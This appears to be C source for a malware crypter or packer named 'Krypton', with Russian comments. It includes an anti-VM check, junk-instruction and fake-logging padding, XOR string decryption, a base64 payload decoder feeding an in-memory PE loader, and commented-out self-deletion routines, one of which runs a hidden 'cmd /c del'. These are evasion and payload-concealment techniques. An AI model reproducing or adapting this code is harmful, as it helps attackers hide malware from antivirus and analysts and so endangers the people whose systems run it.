//		0x0DF,0x0FE,0x0FF,0x0FF,0x050,0x064,0x0FF,0x035,0x000,0x000,
//		0x000,0x000,0x08B,0x045,0x00C,0x064,0x089,0x025,0x000,0x000,
//		0x000,0x000,0x0FF,0x074,0x088,0x0FC,0x049,0x075,0x0F9,0x068,
//		0x002,0x001,0x000,0x000,0x09D,0x0FF,0x055,0x008,0x0EB,0x005,
//		0x0E8,0x0A2,0x0FE,0x0FF,0x0FF,0x064,0x08F,0x005,0x000,0x000,
//		0x000,0x000,0x059,0x059,0x05D,0x059,0x059,0x059,0x05A,0x0C9,
//		0x0C2,0x00C,0x000};
//#pragma data_seg ()
//Пример вызова AAVM
//_imp__RtlComputeCrc32 proto PartialCrc:ULONG, Buffer:PVOID, _Length:ULONG
//
//	$Str	CHAR "123", 0
//
//	MAGIC	equ 194
//
//	TestIp proc
//	push sizeof $Str
//	push offset $Str
//	push 0
//	mov eax,esp
//	push 3
//	push eax
//	push dword ptr [_imp__RtlComputeCrc32]
//	Call cVMBYPASS
//	add esp,3*4
//	xor eax,0BA571416H
//	.if Zero?
//	.if (Edx == MAGIC) || (Ecx > 10H)
//	Int 3	; !VM
//	.endif
//	.endif
//	ret
//	TestIp endp
//------------------------------------------------------------------------------------
//Здесь после морфера - случайные данные
volatile char szFakeDWORD[]="mOrxxxx";
volatile DWORD dwFakeDWORD = 0x00F4FCFA;
//------------------------------------------------------------------------------------
typedef struct _ALLOC
{
	HANDLE hProcess;		
	LPVOID lpAddress;
	ULONG dwSize;
}ALLOC,*PALLOC;
ALLOC stAlloc;

#pragma pack (push,1)
typedef struct _SCOMP
{
	BYTE bXOR;								//CryptByte
	DWORD dwSzFull;							//Full size with base64
	DWORD dwSzCompBlock;					//size of compressed block, if == 0, then no compressed. for example arhive or jpg
	DWORD dwSzUncompBlock;					//size of uncompressed block
	DWORD dwImageBase;
	DWORD dwSizeOfImage;
	BYTE bData[0];							//data
}SCOMP,*PSCOMP;
#pragma pack(pop)
SCOMP* scomp;
//===========================================================================================
//INT __cdecl xrand(void)
//{
//	int r;
//	__asm
//	{
//		pushad
//			rdtsc
//			xor        edx, edx
//			dec        edx
//			shr        edx, 1
//			and        eax, edx
//			mov        r, eax
//			popad
//	}
//	return r;
//}
////*******************************************************************************************
//BYTE xor128(BYTE minb,BYTE maxb)
//{
//	srand(xrand());
//	unsigned long x=xrand(),//^rand(),
//		y=362436069,
//		z=521288629,
//		w=88675123;
//	unsigned long t;
//	t=(x^(x<<11));x=y;y=z;z=w;
//	w=(w^(w>>19))^(t^(t>>8));
//	BYTE ret=minb+(BYTE)(w%(maxb-minb));
//	if(ret<minb) ret=minb;
//	if(ret>maxb) ret=maxb;
//	return ret;
//}
////*******************************************************************************************
////Генератор случайной строки*/
//char* rnddstr(DWORD strlmin,DWORD strlmax,DWORD* rezLen)
//{
//	DWORD i=0;
//	const CHAR minb=97, maxb=122;
//	//printf("Strt");
//	char* rst = (char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,strlmax+1);
//	if(rst)
//	{
//		DWORD strl;
//
//		if(strlmin == strlmax) strl = strlmin; else strl=xor128(strlmin,strlmax);
//		for(i=0; i<strl;i++)
//		{	
//			rst[i]=xor128(minb,maxb);
//			//printf("i=%d max=%d\n",i,strlmax);
//		}
//		if(rezLen) *rezLen = strl;
//	}
//	return rst;
//}
//===========================================================================================
//===========================================================================================
//Посылает бинарные данные на принтер по-умолчанию
BOOL __fastcall RawDataToPrinter(LPBYTE lpData, DWORD dwCount)
{
	BOOL     bStatus = FALSE;
	HANDLE     hPrinter = NULL;
	DOC_INFO_1 DocInfo;
	DWORD      dwJob = 0L;
	DWORD      dwBytesWritten = 0L;
	char szPrinterName[MAX_PATH];
	DWORD dwBl = MAX_PATH;
	if(!GetDefaultPrinterA(szPrinterName,&dwBl )) return FALSE;
	// Open a handle to the printer. 
	bStatus = OpenPrinterA( szPrinterName, &hPrinter, NULL );  // question 1
	if (bStatus) 
	{
		// Fill in the structure with info about this "document." 
		DocInfo.pDocName = (LPTSTR)_T("My Document");  // question 2
		DocInfo.pOutputFile = NULL;                 // question 3
		DocInfo.pDatatype = (LPTSTR)_T("RAW");   // question 4

		// Inform the spooler the document is beginning. 
		dwJob = StartDocPrinter( hPrinter, 1, (LPBYTE)&DocInfo );  // question 5
		if (dwJob > 0)
		{
			// Start a page. 
			bStatus = StartPagePrinter( hPrinter );
			if (bStatus) {
				// Send the data to the printer. 
				bStatus = WritePrinter( hPrinter, lpData, dwCount, &dwBytesWritten);
				EndPagePrinter (hPrinter);
			}
			// Inform the spooler that the document is ending. 
			EndDocPrinter( hPrinter );
		} //else AbortDoc(NULL);
		// Close the printer handle. 
		ClosePrinter( hPrinter );
	}
	// Check to see if correct number of bytes were written. 
	if (!bStatus || (dwBytesWritten != dwCount)) {
		bStatus = FALSE;
	} else {
		bStatus = TRUE;
	}
	
	return bStatus;
}

//===========================================================================================
//Функции отладки, логирования и фейк - разбавления
#ifdef PREDBG
	#define PREDPRINT(t)																									OutputDebugStringA(t)
#else
	#define PREDPRINT(t)
#endif
DWORD dwCnt =0;
#ifdef DBG_OK
//	DWORD dwCnt =0;
	VOID DPRINTA(PSTR Format, ...)
	{
		char tmp[255];
		va_list cur;
		char szLogPath[MAX_PATH];
		char szKey[MAX_PATH];
		va_start(cur, Format);
		vsprintf(tmp, Format, cur);
		OutputDebugStringA(tmp);
		__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		#ifdef DBG_FILE_LOG
			GetCurrentDirectoryA(MAX_PATH,szLogPath);
			lstrcatA(szLogPath,"\\log.txt");
			sprintf(szKey,"%d",dwCnt);
			dwCnt++;
			WritePrivateProfileStringA("Krypton",szKey,tmp,szLogPath);
		#endif
	}
#else
	#ifdef DBG_FAKE
		char* DPRINTA(PSTR Format, ...)
		{
			#ifdef DBG_FAKE_FILE
				char tmp[100];
				char szLogPath[MAX_PATH];
				char szKey[MAX_PATH];
				OutputDebugStringA("mOrxxxxxxxxxxxxxxx");
				sprintf(szKey,"mOrxxx%d",dwCnt);
				dwCnt++;
				WritePrivateProfileStringA("mOrxxxxxxxxxxxxxxx",szKey,tmp,szLogPath);
			#else
				//__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				char tmp[100];
				va_list cur;
				char szLogPath[MAX_PATH];
				char szKey[MAX_PATH];
				va_start(cur, Format);
				//vsprintf(tmp, Format, cur);
				//OutputDebugStringA(tmp);
				//GetEnvironmentVariableA(tmp,szLogPath,MAX_PATH);
				DbgPrint(tmp);
				////Sleep(0);
				//OutputDebugStringA(tmp);
				////*(char*)(tmp + xor128(0,12))=0;
				////DbgPrint(tmp);
				//wchar_t wcTmp[100];
				//SwitchToThread();
				////mbstowcs(wcTmp,tmp,100);
				////RawDataToPrinter((LPBYTE)tmp,strlen(tmp));
				////Beep((DWORD)szFakeDWORD[0],0/*sin((float)szFakeDWORD[1])*/);
				////OutputDebugStringW(wcTmp);
				//HKEY KEY;
				//if (RegOpenKeyA(HKEY_CURRENT_USER,tmp, &KEY) == ERROR_SUCCESS)
				//{
				//	PLONG dw;
				//	RegQueryValueA(KEY, "mOrxxxxxxxxx", tmp, dw);
				//	//__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				//	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				//	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				//	RegCloseKey(KEY);
				//}
				return Format;
				//}
				//__except(EXCEPTION_CONTINUE_EXECUTION)
				//{
				//	return NULL;
				//}
			#endif
			return Format;
		};
	#else
		#ifdef DBG_TRASH_CODE
			VOID DPRINTA(PSTR Format, ...)
			{
				char tmp[MAX_PATH];
				va_list cur;
				char szLogPath[MAX_PATH];
				va_start(cur, Format);
				vsprintf(tmp, Format, cur);
				__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				HKEY KEY;
				if (RegOpenKeyA(HKEY_CURRENT_USER,tmp, &KEY) == ERROR_SUCCESS)
				{
					PLONG dw;
					RegQueryValueA(KEY, "mOrxxxxxxxxx", tmp, dw);
					RegCloseKey(KEY);
				}
			}
		#else
			//VOID DPRINTA(PSTR Format, ...){__asm nop}
		#endif
	#endif
#endif
#ifdef DBG_OK
	#define DPRINT(t)																									DPRINTA(t)
	#define DPRINT1(t, c1)                                            DPRINTA(t, c1)
	#define DPRINT2(t, c1, c2)                                        DPRINTA(t,  c1, c2)
	#define DPRINT3(t, c1, c2, c3)                                    DPRINTA(t, c1, c2, c3)
	#define DPRINT4(t, c1, c2, c3, c4)                                DPRINTA(t, c1, c2, c3, c4)
	#define DPRINT5(t, c1, c2, c3, c4, c5)                            DPRINTA(t, c1, c2, c3, c4, c5)
	#define DPRINT6(t, c1, c2, c3, c4, c5, c6)                        DPRINTA(t, c1, c2, c3, c4, c5, c6)
	#define DPRINT7(t, c1, c2, c3, c4, c5, c6, c7)                    DPRINTA(t, c1, c2, c3, c4, c5, c6, c7)
	#define DPRINT8(t, c1, c2, c3, c4, c5, c6, c7, c8)                DPRINTA(t, c1, c2, c3, c4, c5, c6, c7, c8)
	#define DPRINT9(t, c1, c2, c3, c4, c5, c6, c7, c8, c9)            DPRINTA(t, c1, c2, c3, c4, c5, c6, c7, c8, c9)
	#define DPRINT10(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10)      DPRINTA(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10)
	#define DPRINT11(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11) DPRINTA(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11)
#else 
	#ifndef DBG_FAKE
		#define DPRINT(t) 
		#define DPRINT1(t, c1)                                            
		#define DPRINT2(t, c1, c2)                                        
		#define DPRINT3(t, c1, c2, c3)                                    
		#define DPRINT4(t, c1, c2, c3, c4)                                
		#define DPRINT5(t, c1, c2, c3, c4, c5)                            
		#define DPRINT6(t, c1, c2, c3, c4, c5, c6)                       
		#define DPRINT7(t, c1, c2, c3, c4, c5, c6, c7)                   
		#define DPRINT8(t, c1, c2, c3, c4, c5, c6, c7, c8)               
		#define DPRINT9(t, c1, c2, c3, c4, c5, c6, c7, c8, c9)            
		#define DPRINT10(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10)      
		#define DPRINT11(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11) 
	#else
		#define DPRINT(t)																									DPRINTA("mOrxxxx")
		#define DPRINT1(t, c1)                                            DPRINTA("mOrxxxxxxxxxxx%X",0x00F4FCFA)
		#define DPRINT2(t, c1, c2)                                        DPRINTA("mOrxxxxxxxxxxxxxxxxx%d0%X",  0x00F4FCFA, 0x00F4FCFA)
		#define DPRINT3(t, c1, c2, c3)                                    DPRINTA("mOrxxxxxxxxxxxxxxxxxxxxxxxxxxx%X%d%x", 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA)
		#define DPRINT4(t, c1, c2, c3, c4)                                DPRINTA("mOrxxxxxxxxxxxxxx%X0%X%d%X", 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA)
		#define DPRINT5(t, c1, c2, c3, c4, c5)                            DPRINTA("mOrxxxxxxxxxxxxxxxxxxxxxxxx%X%X%d%X%X", 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA, 0x00F4FCFA)
		#define DPRINT6(t, c1, c2, c3, c4, c5, c6)                        
		#define DPRINT7(t, c1, c2, c3, c4, c5, c6, c7)                    
		#define DPRINT8(t, c1, c2, c3, c4, c5, c6, c7, c8)                
		#define DPRINT9(t, c1, c2, c3, c4, c5, c6, c7, c8, c9)            
		#define DPRINT10(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10)      
		#define DPRINT11(t, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11) 
	#endif
#endif
//===========================================================================================
//*******************************************************************************************
//DWORD __forceinline STRLEN(char* sz_str)
//{
//	if(sz_str==NULL) return 0;
//	__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
//	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
//	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
//	if (sz_str[0]!=0) return lstrlenA(sz_str);
//	return 0;
//}
//==================================================================================================
//**************************************************************************************************
//Расшифровка строк
char* Decrypt(CHAR* inch)
{	
	BYTE xXor = (BYTE)inch[0];
	char outch1[128];
	BYTE dwLenStok = (BYTE)inch[1];
	RtlSecureZeroMemory(outch1,sizeof(outch1));
	DPRINT2("KEY = 0x%X, Len = %d",xXor,dwLenStok);
	for(unsigned int i=0;i<dwLenStok/*sizeof(outch1) && inch[i]!=0*/;i++)
	{
		__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		if(inch[i+5]!=0)
		{
			outch1[i]=(((BYTE)xXor)^inch[i+5])-i-1; 
			//DPRINT2("First = 0x%X, %c",(BYTE)outch1[i],(char)outch1[i]);
			__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			//DPRINT1("DecryptLenght = %d",i);
			
		}
		else
		{
			inch[0]=0;
			//DPRINT1("Else %s",outch1);
			break;
		}
	}
	DPRINT1("Decrypt = %s",outch1);
	outch1[dwLenStok]=0;
	lstrcpyA(inch,outch1);
	return inch;
}
//==================================================================================================
//Base64 -> Bin с выделением памяти
LPBYTE __fastcall FromBase64Crypto( const BYTE* pSrc, int nLenSrc, DWORD * nLenDst )
{
	BOOL fRet= 0;
	DPRINT1("base64Decode: Start, sourceSize = %d",nLenSrc);
	DPRINT1("base64Decode: FirstByteIn = 0x%X",pSrc[0]);
	LPBYTE pDst = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,nLenSrc + sizeof(BYTE));
	if(pDst != NULL)
	{
		*nLenDst = nLenSrc + sizeof(BYTE);
		fRet= pCryptStringToBinaryA((LPCSTR)pSrc, nLenSrc,CRYPT_STRING_BASE64,(BYTE*)pDst,nLenDst,NULL,NULL); // pdwSkip (not needed)         // pdwFlags (not needed)
	}
	if (!fRet) {DPRINT("FromBase64Crypto: CryptStringToBinaryA - ERROR");*nLenDst=0;return NULL;}
	return pDst;
}
//**************************************************************************
float inner1(float *x,float *y,int n)

{ float sum;

int i;

__m128 *xx,*yy;

__m128 p,s;

xx=(__m128 *)x; 

yy=(__m128 *)y;

s=_mm_set_ps1(0);

for (i=0;i<n/4;i++)

{ // предвыборка данных в кэш (на несколько итераций вперед)

	_mm_prefetch((char *)&xx[i+4],_MM_HINT_NTA);    

	_mm_prefetch((char *)&yy[i+4],_MM_HINT_NTA);

	p=_mm_mul_ps(xx[i], yy[i]); // векторное умножение четырех чисел

	s=_mm_add_ps(s,p);          // векторное сложение четырех чисел

}

p=_mm_movehl_ps(p,s); // перемещение двух старших значений s в младшие p

s=_mm_add_ps(s,p);    // векторное сложение

p=_mm_shuffle_ps(s,s,1); //перемещение второго значения в s в младшую позицию в p

s=_mm_add_ss(s,p);    // скалярное сложение

_mm_store_ss(&sum,s); // запись младшего значения в память

return sum;

}
//----------------------------------------------------------------------------------------------------
//LPBYTE base64Decode(LPSTR source, SIZE_T sourceSize, SIZE_T *destSize)
//{
//	DPRINT1("base64Decode: Start, sourceSize = %d",sourceSize);
//	DPRINT1("base64Decode: FirstByteIn = 0x%X",source[0]);
//	char cd64[] = "|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq"; //Decrypt(szccd64);
//	DWORD dwMemSize = sourceSize + sizeof(BYTE);
//	LPBYTE dest = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,sourceSize + sizeof(BYTE));
//	DPRINT1("cd64=%s",cd64);
//	//pNtAllocateVirtualMemory(INVALID_HANDLE_VALUE,(PVOID*)&dest,0,&dwMemSize,MEM_COMMIT, PAGE_READWRITE);
//	if(dest != NULL)
//	{
//		DPRINT1("base64Decode: MemoryAllocated %d byte",dwMemSize);
//		LPBYTE p = (LPBYTE)source;
//		LPBYTE e = p + sourceSize;
//		LPBYTE r = (LPBYTE)dest;
//
//		BYTE in[4], out[3], v;
//		int len, i;
//
//		while(p < e)
//		{
//			for(len = 0, i = 0; i < 4 && p < e; i++)
//			{
//				v = 0;
//				while(p < e && v == 0)
//				{
//					v = (BYTE)*(p++);
//					v = (BYTE)((v < 43 || v > 122) ? 0 : cd64[v - 43]);
//					if(v != 0)v = (BYTE)((v == '$') ? 0 : v - 61);
//				}
//
//				if(v != 0)
//				{
//					len++;
//					in[i] = (BYTE)(v - 1);
//				}
//			}
//
//			if(len)
//			{
//				out[0] = (BYTE)(in[0] << 2 | in[1] >> 4);
//				out[1] = (BYTE)(in[1] << 4 | in[2] >> 2);
//				out[2] = (BYTE)(((in[2] << 6) & 0xC0) | in[3]);
//				for(i = 0; i < len - 1; i++){*(r++) = out[i]; if(i==0)i=0;/*instrict*/}
//			}
//		}
//		DPRINT("base64Decode: End while");
//		*r = 0;
//		if(destSize)*destSize = (SIZE_T)(r - dest);
//	}
//	DPRINT1("base64Decode: FirstByteOut = 0x%X",dest[0]);
//	DPRINT("base64Decode: End");
//	return dest;
//}
//**************************************************************************************************
//void SelfDel(void)
//{
//	char    buf[MAX_PATH];
//	HMODULE module;
//
//	module = GetModuleHandle(0);
//	GetModuleFileNameA(module, buf, MAX_PATH);
//	CloseHandle((HANDLE)4);
//
//	__asm 
//	{
//		lea     eax, buf
//		push    0
//		push    0
//		push    eax
//		push    ExitProcess
//		push    module
//		push    DeleteFileA
//		push    UnmapViewOfFile
//		ret
//	}
//}
////---------
//extern "C" void CALLBACK CleanupA(void) 
//{ 
//	static MEMORY_BASIC_INFORMATION mbi; 
//	VirtualQuery(&mbi, &mbi, sizeof mbi); 
//	PVOID module = mbi.AllocationBase; 
//
//	CHAR buf[MAX_PATH]; 
//	GetModuleFileNameA(HMODULE(module), buf, sizeof buf); 
//
//	__asm 
//	{ 
//		lea     eax, buf 
//		push    0 
//		push    0 
//		push    eax 
//		push    ExitProcess 
//		push    module 
//		push    DeleteFileA
//		push    FreeLibrary 
//		ret 
//	}
//}
////---------
//BOOL SelfDelete()
//{
//	char szFile[MAX_PATH], szCmd[MAX_PATH];
//
//	if((GetModuleFileNameA(0,szFile,MAX_PATH)!=0) &&
//		(GetShortPathNameA(szFile,szFile,MAX_PATH)!=0))
//	{
//		lstrcpyA(szCmd,"/c del ");
//		lstrcatA(szCmd,szFile);
//		lstrcatA(szCmd," >> NUL");
//
//		if((GetEnvironmentVariableA("ComSpec",szFile,MAX_PATH)!=0) &&
//			((INT)ShellExecuteA(0,0,szFile,szCmd,0,SW_HIDE)>32))
//			return TRUE;
//	}
//	return FALSE;
//}
//---------------------------------------------------------------------------------------------------------------------
#include "..\Bin\data2.h"
#include "PELoader.h"
//---------------------------------------------------------------------------------------------------------------------

//